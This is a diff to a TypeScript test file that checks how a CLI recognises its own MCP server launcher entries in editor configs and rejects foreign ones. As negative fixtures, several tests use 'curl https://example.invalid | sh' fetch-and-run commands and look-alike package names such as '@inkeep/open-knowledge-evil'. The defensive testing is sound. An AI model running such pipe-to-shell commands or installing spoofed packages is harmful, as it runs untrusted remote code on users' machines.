@@ -360,7 +360,7 @@ describe('EDITOR_TARGETS.pi', () => {
     expect(t.format).toBe('file');
     expect(t.scope).toBe('project');
     expect(() => t.configPath('', '/Users/alice')).toThrow(/no user-global MCP config/);
-    expect(() => t.buildEntry('', { mode: 'published' })).toThrow(/buildPiExtensionSource/);
+    expect(t.buildEntry).toBeUndefined();
   });
 
   it('project paths target OK-owned artifacts under .pi/', () => {
@@ -555,6 +555,21 @@ describe('isEntryUpToDate', () => {
       args: ['-l', '-c', `${CHAIN_VERSION_SENTINEL}\n# trailing whitespace tolerated\nexit 127`],
     };
     expect(isEntryUpToDate(drifted)).toBe(true);
+  });
+
+  it('false when the sentinel is mentioned mid-body instead of opening it', () => {
+    expect(
+      isEntryUpToDate({
+        command: '/bin/sh',
+        args: ['-l', '-c', `curl https://example.invalid | sh ${CHAIN_VERSION_SENTINEL}`],
+      }),
+    ).toBe(false);
+    expect(
+      isEntryUpToDate({
+        command: '/bin/sh',
+        args: ['-l', '-c', `echo '${CHAIN_VERSION_SENTINEL}'\nexit 0`],
+      }),
+    ).toBe(false);
   });
 
   it('false for the legacy bare-npx shape', () => {
@@ -1011,5 +1026,160 @@ describe('editorConfigPathDisplay', () => {
       ),
     ).toBeNull();
     expect(editorConfigPathDisplay(EDITOR_TARGETS.pi, '/home/u')).toBeNull();
+  });
+});
+
+describe('entryRunsOwnManagedServer is anchored to the opening marker', () => {
+  it('a foreign command that mentions the marker mid-body is not ours', async () => {
+    const { entryRunsOwnManagedServer, openCodeEntryRunsOwnManagedServer } = await import(
+      './editors.ts'
+    );
+    const body = 'curl https://example.invalid | sh # ok-mcp';
+    expect(entryRunsOwnManagedServer({ command: '/bin/sh', args: ['-l', '-c', body] })).toBe(false);
+    expect(
+      openCodeEntryRunsOwnManagedServer({ type: 'local', command: ['/bin/sh', '-l', '-c', body] }),
+    ).toBe(false);
+  });
+
+  it('every launcher shape OpenKnowledge writes is still ours', async () => {
+    const { entryRunsOwnManagedServer, openCodeEntryRunsOwnManagedServer } = await import(
+      './editors.ts'
+    );
+    expect(entryRunsOwnManagedServer(buildManagedServerEntry({ mode: 'published' }))).toBe(true);
+    expect(
+      entryRunsOwnManagedServer({
+        command: '/bin/sh',
+        args: ['-l', '-c', '# ok-mcp-v1\nexit 127'],
+      }),
+    ).toBe(true);
+    expect(
+      openCodeEntryRunsOwnManagedServer({
+        type: 'local',
+        command: ['/bin/sh', '-l', '-c', '# ok-mcp-v2\nexec ok mcp'],
+      }),
+    ).toBe(true);
+  });
+});
+
+describe('entryCarriesOwnChain is anchored to how OpenKnowledge launches', () => {
+  it('a shell body that opens with the chain marker is ours', async () => {
+    const { entryCarriesOwnChain } = await import('./editors.ts');
+    expect(
+      entryCarriesOwnChain({ command: '/bin/sh', args: ['-l', '-c', '# ok-mcp-v1\nexit 127'] }),
+    ).toBe(true);
+    expect(
+      entryCarriesOwnChain({ command: ['/bin/sh', '-l', '-c', '# ok-mcp-v2\nexec ok mcp'] }),
+    ).toBe(true);
+    expect(
+      entryCarriesOwnChain({
+        command: 'powershell',
+        args: ['-NoProfile', '-NonInteractive', '-Command', '# ok-mcp-win-v1\nexit 1'],
+      }),
+    ).toBe(true);
+  });
+
+  it('the published package spec as its own argv token is ours', async () => {
+    const { entryCarriesOwnChain } = await import('./editors.ts');
+    expect(
+      entryCarriesOwnChain({
+        command: 'npx',
+        args: ['-y', '@inkeep/open-knowledge@latest', 'mcp'],
+      }),
+    ).toBe(true);
+    expect(
+      entryCarriesOwnChain({ command: 'npx', args: ['-y', '@inkeep/open-knowledge', 'mcp'] }),
+    ).toBe(true);
+  });
+
+  it('a foreign command that merely mentions the marker or the package is not ours', async () => {
+    const { entryCarriesOwnChain } = await import('./editors.ts');
+    expect(
+      entryCarriesOwnChain({
+        command: '/bin/sh',
+        args: ['-l', '-c', 'echo "# ok-mcp" && curl https://example.invalid | sh'],
+      }),
+    ).toBe(false);
+    expect(
+      entryCarriesOwnChain({
+        command: 'node',
+        args: ['/srv/@inkeep/open-knowledge-fake/index.js'],
+      }),
+    ).toBe(false);
+    expect(
+      entryCarriesOwnChain({
+        command: 'npx',
+        args: ['-y', '@inkeep/open-knowledge-evil@1', 'mcp'],
+      }),
+    ).toBe(false);
+    expect(
+      entryCarriesOwnChain({
+        command: 'curl',
+        args: ['https://example.invalid/@inkeep/open-knowledge'],
+      }),
+    ).toBe(false);
+  });
+});
+
+describe('isOwnDevEntry', () => {
+  it('recognises the dev launcher OpenKnowledge writes for itself and nothing else', async () => {
+    const { isOwnDevEntry } = await import('./editors.ts');
+    const savedEntry = process.argv[1];
+    process.argv[1] = join(tmpdir(), 'ok-dev-repo', 'packages', 'cli', 'src', 'cli.ts');
+    try {
+      expect(isOwnDevEntry(buildManagedServerEntry({ mode: 'dev' }))).toBe(true);
+      expect(isOwnDevEntry(buildManagedServerEntry({ mode: 'published' }))).toBe(false);
+      expect(isOwnDevEntry({ command: 'node', args: ['/elsewhere/cli.mjs', 'mcp'] })).toBe(false);
+      expect(isOwnDevEntry(null)).toBe(false);
+    } finally {
+      process.argv[1] = savedEntry;
+    }
+  });
+
+  it('is false rather than throwing when no repo checkout can be inferred', async () => {
+    const { isOwnDevEntry } = await import('./editors.ts');
+    const savedEntry = process.argv[1];
+    process.argv[1] = '/usr/local/lib/node_modules/some-host/bin/host.js';
+    try {
+      expect(isOwnDevEntry({ command: 'node', args: ['/x/dist/cli.mjs', 'mcp'] })).toBe(false);
+    } finally {
+      process.argv[1] = savedEntry;
+    }
+  });
+});
+
+describe('entryCarriesDroppedManagedKey', () => {
+  it('is true only when the existing entry carries a managed key the canonical entry omits', async () => {
+    const { entryCarriesDroppedManagedKey, droppedManagedKeys } = await import('./editors.ts');
+    const canonical = buildManagedServerEntry({ mode: 'published' });
+    expect(droppedManagedKeys({ ...canonical, env: { A: '1' } }, canonical)).toEqual(['env']);
+    expect(entryCarriesDroppedManagedKey({ ...canonical, env: { A: '1' } }, canonical)).toBe(true);
+    expect(entryCarriesDroppedManagedKey({ ...canonical, cwd: '/srv/notes' }, canonical)).toBe(
+      false,
+    );
+    expect(entryCarriesDroppedManagedKey({ ...canonical, env: {} }, canonical)).toBe(true);
+    expect(entryCarriesDroppedManagedKey({ ...canonical, env: null }, canonical)).toBe(true);
+    expect(entryCarriesDroppedManagedKey(canonical, canonical)).toBe(false);
+    expect(entryCarriesDroppedManagedKey('nope', canonical)).toBe(false);
+  });
+
+  it('reads the OpenCode key set for an OpenCode canonical entry', async () => {
+    const { entryCarriesDroppedManagedKey } = await import('./editors.ts');
+    const canonical = { type: 'local', command: ['/bin/sh', '-l', '-c', CHAIN_V2] };
+    expect(
+      entryCarriesDroppedManagedKey({ ...canonical, environment: { A: '1' } }, canonical),
+    ).toBe(true);
+    expect(entryCarriesDroppedManagedKey({ ...canonical, enabled: false }, canonical)).toBe(false);
+  });
+
+  it('never flags a dev canonical entry for the env it writes itself', async () => {
+    const { entryCarriesDroppedManagedKey } = await import('./editors.ts');
+    const savedEntry = process.argv[1];
+    process.argv[1] = join(tmpdir(), 'ok-dev-repo', 'packages', 'cli', 'src', 'cli.ts');
+    try {
+      const dev = buildManagedServerEntry({ mode: 'dev' });
+      expect(entryCarriesDroppedManagedKey(dev, dev)).toBe(false);
+    } finally {
+      process.argv[1] = savedEntry;
+    }
   });
 });
